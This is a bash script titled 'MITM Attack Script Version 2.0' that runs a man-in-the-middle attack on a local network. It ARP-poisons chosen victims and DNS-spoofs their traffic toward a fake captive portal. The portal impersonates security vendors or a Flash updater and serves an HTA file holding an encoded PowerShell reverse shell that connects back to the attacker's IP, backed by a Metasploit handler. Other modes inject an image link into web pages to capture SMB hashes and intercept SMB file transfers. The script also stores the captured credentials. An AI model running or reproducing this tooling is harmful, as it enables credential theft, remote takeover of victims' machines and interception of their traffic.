#! /bin/bash

ScriptName="MITM Attack Script Version 2.0"
fdate=`date +%m.%d.%y-%k.%M`
#DEFINED COLOR SETTINGS
RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)
mkdir -p ~/temp
mkdir -p ~/mitm-creds/

InstallDeps()
{
# Installing dependencies
if ! dpkg -s conntrack > /dev/null; then
   echo -e "Installing conntrack"
   sudo apt-get -y --force-yes install conntrack
      if ! dpkg -s conntrack > /dev/null; then
        echo -e "Install Failed - Check Internet Connection!"
	exit 0
      fi
fi
}

CreateFiles()
{
# Verify /var/lib/users Exists
#if [ ! -e "/var/lib/users" ]; then
   echo -e "User ID \t | Password \t | IP Address \t | MAC \t | Date" >/var/lib/users
#fi
chown www-data /var/lib/users

# Verify /usr/bin/rmtrack Exists
if [ ! -e "/usr/bin/rmtrack" ]; then
echo -e "/usr/sbin/conntrack -L \\" > /usr/bin/rmtrack
echo -e "    |grep \$1 \\" >> /usr/bin/rmtrack
echo -e "    |grep ESTAB \\" >> /usr/bin/rmtrack
echo -e "    |grep 'dport=80' \\" >> /usr/bin/rmtrack
echo -e "    |awk \\" >> /usr/bin/rmtrack
echo -e "        \"{ system(\\\"conntrack -D --orig-src \$1 --orig-dst \\\" \\" >> /usr/bin/rmtrack
echo -e "            substr(\\\$6,5) \\\" -p tcp --orig-port-src \\\" substr(\\\$7,7) \\\" \\" >> /usr/bin/rmtrack
echo -e "            --orig-port-dst 80\\\"); }\"" >> /usr/bin/rmtrack
fi
chmod +x /usr/bin/rmtrack

# Verify /etc/sudoers.d/mitm-captive Exists
if [ ! -e "/etc/sudoers.d/mitm-captive" ]; then
echo -e "www-data ALL = NOPASSWD: /sbin/iptables -I internet 1 -t nat -m mac --mac-source ??\:??\:??\:??\:??\:?? -j RETURN" > /etc/sudoers.d/mitm-captive
echo -e "www-data ALL = NOPASSWD: /sbin/iptables -D internet -t nat -m mac --mac-source ??\:??\:??\:??\:??\:?? -j RETURN" >> /etc/sudoers.d/mitm-captive
echo -e "www-data ALL = NOPASSWD: /usr/bin/rmtrack [0-9]*.[0-9]*.[0-9]*.[0-9]*" >> /etc/sudoers.d/mitm-captive
fi
}

CreateFirewallRules()
{
clear
echo
echo $BLUE"$ScriptName"
echo
echo $RED"************************************************";
echo $RED"Enter the Attacker Interface. Example eth0:";
read -e INTERFACE
xterm -bg blue -fg white -geometry 100x30+1000 -T "Network Config" -e "route -n && echo && ifconfig $INTERFACE && sleep 7m"&
if [ $attacktype  -eq 1 ] || [ $attacktype -eq 2 ]; then
    echo $RED"Enter the Gateway IP address. Example 192.168.1.1:";
    read -e GATEWAY
    echo $RED"Enter the Attacker IP address. Example 192.168.1.100:";
    read -e ATTACKER
fi
xterm -bg blue -fg white -geometry 100x50+1000 -T "Passive ARP Discovery" -e "netdiscover -i $INTERFACE -p"&
echo $RED"Enter the Number of Victims to Poison:";
read -e VICTIMCOUNT
#echo $RED"************************************************";
#echo ""

IPTABLES=/sbin/iptables

#clear
#echo
#echo $BLUE"$ScriptName"
echo
echo $RED"************************************************";
echo $RED"Enter the Victim IP addresses, seperated by <ENTER>."; 
echo $RED"Example 192.168.1.2:";

VICTIM=()
VICTIMSHRT=()
   for ((i=1; i<=VICTIMCOUNT; i++));
   do
      read -e VICTIMTEMP
      $IPTABLES -A FORWARD -s $VICTIMTEMP -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
      VICTIM+=( $VICTIMTEMP )
      if [ $i -gt 1 ]; then
         VICTIMSHRT+=$( echo "," && echo $VICTIMTEMP|cut -d "." -f 4)
      fi
   done
   #Remove Spaces
   VICTIMSHRTEMP=`echo ${VICTIMSHRT[*]} | sed 's/ //g'`
   VICTIMSHORT=`echo ${VICTIMSHRT[*]} | sed 's/ //g'`
   #Remove first two chars
   #VICTIMSHORT=`echo $VICTIMSHRTEMP| awk '{print substr($0,3)}'`
   #Appends Victim1,Victim2,Victim3,...
   #Ettercap Format

if [ $VICTIMCOUNT -gt 1 ]; then
   TARGETS=${VICTIM[0]}${VICTIMSHORT[*]}
else
   TARGETS=$VICTIMTEMP
fi

#DEBUG
#echo "VICTIM=${VICTIM[@]}"
#echo $VICTIMSHRT
#echo $VICTIMSHRTEMP
#echo $VICTIMSHORT
#echo $TARGETS

# FIREWALL SCRIPT
# /usr/local/sbin/iptables
# Create internet chain and add allow rules
# This is used to authenticate users who have already signed up
#$IPTABLES -A FORWARD -s $VICTIM -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
$IPTABLES -A INPUT -p udp -m udp --sport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
$IPTABLES -N internet -t nat
# First send all traffic via newly created internet chain
# At the prerouting NAT stage this will DNAT them to the local
# webserver for them to signup if they aren't authorized
# Packets for unauthorized users are marked for dropping later
$IPTABLES -t nat -A PREROUTING -j internet
###### INTERNET CHAIN ##########
# Allow authorized clients in, redirect all others to login webserver
# Add known users to the NAT table to stop their dest being rewritten
# Ignore MAC address with a * - these users are blocked
# This awk script goes through the /var/lib/users flat file line by line
#awk 'BEGIN { FS="t"; } { system("$IPTABLES -t nat -A internet -m mac --mac-source "$4" -j RETURN"); }' /var/lib/users
# MAC address not found. Mark the packet 99
$IPTABLES -t nat -A internet -j MARK --set-mark 99
# Redirects web requests from Unauthorized users to logon Web Page
$IPTABLES -t nat -A internet -m mark --mark 99 -p tcp --dport 80 -j DNAT --to-destination $ATTACKER
################################
# Now that we've got to the forward filter, drop all packets
# marked 99 - these are unknown users. We can't drop them earlier
# as there's no filter table
$IPTABLES -t filter -A FORWARD -m mark --mark 99 -j DROP
echo
echo "Firewall Config"
echo "----------------------------------------------"
iptables -L
echo
echo $GREEN"Press <ENTER> To Continue"
read -p ""
}

Begin()
{
mkdir ~/temp/www
mv /var/www/* ~/temp/www/
clear
echo
echo $BLUE"$ScriptName"
echo
echo $RED"**************************************************************";
echo $RED"*    1.  Captive Portal - Log In Creds & Reverse Shell       *";
echo $RED"*    2.  SMB - Hash Grab                                     *"; 
echo $RED"*    3.  SMB - File Intercept                                *";
echo $RED"**************************************************************";
echo ""

echo $BLUE"Select Menu Option:"
read attacktype
if [ $attacktype -eq 1 ]; then
HTARS
else
if [ $attacktype -eq 2 ]; then
SMBhash
else
if [ $attacktype -eq 3 ]; then
SMBIntercept
else
Begin
fi
fi
fi
}

HTARS()
{
CreateFirewallRules
clear
port=80,443
echo
echo $BLUE"$ScriptName"
echo $BLUE"Captive Portal - HTA Reverse Shell"
echo
echo $RED"************************************************";
echo $RED"*    1.  Cisco                                 *";
echo $RED"*    2.  Microsoft Forefront                   *"; 
echo $RED"*    3.  Sophos                                *";
echo $RED"*    4.  SQUID                                 *";
echo $RED"*    5.  TrendMicro                            *";
echo $RED"*    6.  Fortigate\\Fortinet                    *";
echo $RED"*    7.  Flash Updater                         *";
echo $RED"*    8.  Forttinet - Old Style                 *";
echo $RED"*    9.  Custom                                *";
echo $RED"************************************************";
echo ""

echo $BLUE"Select Menu Option:"
read menuoption
if [ $menuoption -eq 1 ]; then
tar -xf ~/temp/ploys/HTA/cisco.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption -eq 2 ]; then
tar -xf ~/temp/ploys/HTA/MSForefront.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption -eq 3 ]; then
tar -xf ~/temp/ploys/HTA/Sophos.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption -eq 4 ]; then
tar -xf ~/temp/ploys/HTA/squid.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption -eq 5 ]; then
tar -xf ~/temp/ploys/HTA/trendmicro.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption -eq 6 ]; then
tar -xf ~/temp/ploys/HTA/Fortinet.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption -eq 7 ]; then
tar -xf ~/temp/ploys/HTA/flash.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
#sed -n "/<script/,/<\/script>/p" /var/www/exploit.hta > /var/www/reverse_code.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/install_flash_player.hta
else
if [ $menuoption -eq 8 ]; then
tar -xf ~/temp/ploys/HTA/Fortinet-Old-Style.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption -eq 9 ]; then
echo "Move the web files over to /var/www/ then press <ENTER>"
read -p ""
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
HTARS
fi
fi
fi
fi
fi
fi
fi
fi
fi
ConfigWeb
}


ConfigWeb()
{
clear
if [ $menuoption -eq 7 ]; then
SERVERNAME=get
DOMAINNAME=adobe.com
SITENAME=Flash 
else
echo
echo $BLUE"$ScriptName"
echo $BLUE"Captive Portal - HTA Reverse Shell"
echo
echo $RED"************************************************";
echo $RED"Enter the Desired Server Name, Example: PROXY";
read -e SERVERNAME
echo $RED"Enter the Domain Name, Example: DOMAIN.COM";
read -e DOMAINNAME
echo $RED"Enter the Site Name, Example: Company Web Access Portal";
read -e SITENAME
echo $RED"************************************************";
echo ""

sed -i s/SERVER_NAME_REPLACE/$SERVERNAME/ /var/www/index.php
sed -i s/DOMAIN_NAME_REPLACE/$DOMAINNAME/ /var/www/index.php
sed -i s/SITE_NAME_REPLACE/"$SITENAME"/ /var/www/index.php
fi
ConfigDNS
}

ConfigDNS()
{
echo 1 > /proc/sys/net/ipv4/ip_forward

mv /etc/ettercap/etter.dns ~/temp/etter.dns
echo "*.$SERVERNAME.$DOMAINNAME    A   $ATTACKER" > /etc/ettercap/etter.dns
echo "*.$SERVERNAME.$DOMAINNAME.*    A   $ATTACKER" >> /etc/ettercap/etter.dns
echo "$SERVERNAME.$DOMAINNAME  PTR $ATTACKER" >> /etc/ettercap/etter.dns

echo "$ATTACKER $SERVERNAME.$DOMAINNAME" > /var/www/hosts.txt
}


SMBhash()
{
#echo SMBhash
CreateFirewallRules
RevertFirewall
port=80

#Create Ettercap Filter
echo "if (ip.proto == TCP && tcp.dst == 80) {" > http-img.filter
echo "   if (search(DATA.data, \"Accept-Encoding\")) {" >> http-img.filter
echo "      replace(\"Accept-Encoding\", \"Accept-Rubbish!\");" >> http-img.filter
echo "         # note: replacement string is same length as original string" >> http-img.filter
echo "      msg(\"zapped Accept-Encoding!\\n\");" >> http-img.filter
echo "   }" >> http-img.filter
echo "}" >> http-img.filter
echo "if (ip.proto == TCP && tcp.src == 80) {" >> http-img.filter
#echo "   replace(\"\<\\/body\", \"\<img src=\\"\\\\\\\\$ATTACKER\\\\pixel.gif\\\">\<\\/body \");" >> http-img.filter
echo "   replace(\"<\\/body\", \"<img src=\\\"\\\\\\\\$ATTACKER\\\\pixel.gif\\\"><\\/body \");" >> http-img.filter
echo "   msg(\"Filter Ran 4.\\n\");" >> http-img.filter
echo "}" >> http-img.filter

#Convert Ettercap Filter

echo
echo $BLUE"$ScriptName"
echo $BLUE"Ettercap Image SMB Hash Capture"
echo
echo $RED"************************************************";

etterfilter http-img.filter -o http-img.ef
cp http-img.ef /usr/share/ettercap
cp http-img.ef /usr/local/share/ettercap
rm http-img.filter
}

SMBIntercept()
{
#echo SMBIntercept
CreateFirewallRules
RevertFirewall
PORT=139,445

echo
echo $BLUE"$ScriptName"
echo $BLUE"Ettercap SMB File Intercept"
echo
echo $RED"************************************************";
echo $RED"Enter the Number of File Servers to Poison:";
read -e FILESERVCOUNT
echo
echo $RED"************************************************";
echo $RED"Enter the File Server IP addresses, seperated by <ENTER>."; 
echo $RED"Example 192.168.1.2:";

FILESERV=()
FILESERVSHRT=()
   for ((i=1; i<=FILESERVCOUNT; i++));
   do
      read -e FILESERVTEMP
      FILESERV+=( $FILESERVTEMP )
      if [ $i -gt 1 ]; then
         FILESERVSHRT+=$( echo "," && echo $FILESERVTEMP|cut -d "." -f 4)
      fi
   done
   #Remove Spaces
   FILESERVSHRTEMP=`echo ${FILESERVSHRT[*]} | sed 's/ //g'`
   FILESERVSHORT=`echo ${FILESERVSHRT[*]} | sed 's/ //g'`
   #Remove first two chars
   #FILESERVSHORT=`echo $FILESERVSHRTEMP| awk '{print substr($0,3)}'`
   #Appends Victim1,Victim2,Victim3,...
   #Ettercap Format

   if [ $FILESERVCOUNT -gt 1 ]; then
      FILESERVS=${FILESERV[0]}${FILESERVSHORT[*]}
   else
      FILESERVS=$FILESERVTEMP
   fi

}


Attack()
{
echo 1 > /proc/sys/net/ipv4/ip_forward
if [ $attacktype -eq 1 ]; then
    xterm -bg blue -fg white -geometry 100x500+1000 -T "Metasploit Handler" -e "msfconsole -r /toolslinux/epa/handler/local/handler.rc"&
    echo
    echo $GREEN"Press <ENTER> After Meterpreter Loads"
    read -p ""
    #Java ploy - no creds
    if [ $menuoption -ne 7 ]; then
        xterm -bg blue -fg white -geometry 100x20+1000 -T "User Creds File - /var/lib/users" -e "tail -f /var/lib/users"&
    fi

#Ettercap DNS Spoof
#xterm -bg blue -fg white -geometry 100x70+0 -T "ETTERCAP ARP Poison" -e "ettercap -T -Q -i $INTERFACE -M ARP:remote -P dns_spoof /$TARGETS/ /$GATEWAY/"
#dnsspoof DNS Spoof
xterm -bg blue -fg white -geometry 100x50+300+500 -T "DNS Spoof for $SERVERNAME.$DOMAINNAME" -e "dnsspoof -i $INTERFACE -f /var/www/hosts.txt"&

echo $INTERFACE $TARGETS $GATEWAY
xterm -bg blue -fg white -geometry 100x70+0 -T "ETTERCAP ARP Poison" -e "ettercap -T -Q -i $INTERFACE -M ARP:remote /$TARGETS/ /$GATEWAY/"
echo ""
fi

if [ $attacktype -eq 2 ]; then
    xterm -bg blue -fg white -geometry 100x500+1000 -T "Metasploit Handler" -e "msfconsole -r /toolslinux/epa/handler/local/handler_445-SMB.rc"&
    echo
    echo $GREEN"Press <ENTER> After Meterpreter Loads"
    read -p ""
    echo $INTERFACE $TARGETS $GATEWAY
    xterm -bg blue -fg white -geometry 100x70+0 -T "ETTERCAP ARP Poison" -e "ettercap -TqF http-img.ef -i $INTERFACE -M ARP:remote /$TARGETS/ /$GATEWAY/"
    echo ""
fi

if [ $attacktype -eq 3 ]; then
    wireshark -i $INTERFACE -f "port 139 or port 445" -k &
    xterm -bg blue -fg white -geometry 100x30+1000 -T "SMB How To:" -e "echo 'File -> Export Objects -> SMB//SMB2' && sleep 20m"&
    echo $INTERFACE $TARGETS $FILESERVS $PORT
    xterm -bg blue -fg white -geometry 100x70+0 -T "ETTERCAP ARP Poison" -e "ettercap -T -Q -i $INTERFACE -M ARP /$TARGETS/$PORT /$FILESERVS/$PORT"
    echo ""
fi

}




RevertFirewall()
{
echo ----------------------------------------------
echo "Stopping firewall and allowing everyone..."
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
clear
}




#Begining

COUNT=1
InstallDeps
CreateFiles
RevertFirewall
#NetworkConfig
Begin
#CreateFirewallRules
#ConfigWeb
#ConfigDNS
Attack

mv ~/temp/etter.dns /etc/ettercap/etter.dns
rm -R /var/www/*
mv ~/temp/www/* /var/www/
service apache2 stop

clear
echo 
echo $BLUE"$ScriptName"
echo 
echo $RED"************************************************";
echo $RED"Do You Want to Revert Your Firewall Back to Allow All? (y/n)";
read -e REVERT
if [ "$REVERT" == "y" -o "$REPLY" == "Y" ]; then
   RevertFirewall
fi
echo 0 > /proc/sys/net/ipv4/ip_forward

if [ $attacktype -eq 1 ]; then
	mv /var/lib/users ~/mitm-creds/$fdate.captured-credentials.txt
	echo "Credentials Stored: ~/mitm-creds/$fdate.captured-credentials.txt"
fi
if [ $attacktype -eq 2 ]; then
	mv /toolslinux/epa/logs/msf_meterpreter/* ~/mitm-creds
	echo "Credentials Stored: ~/mitm-creds/"
fi
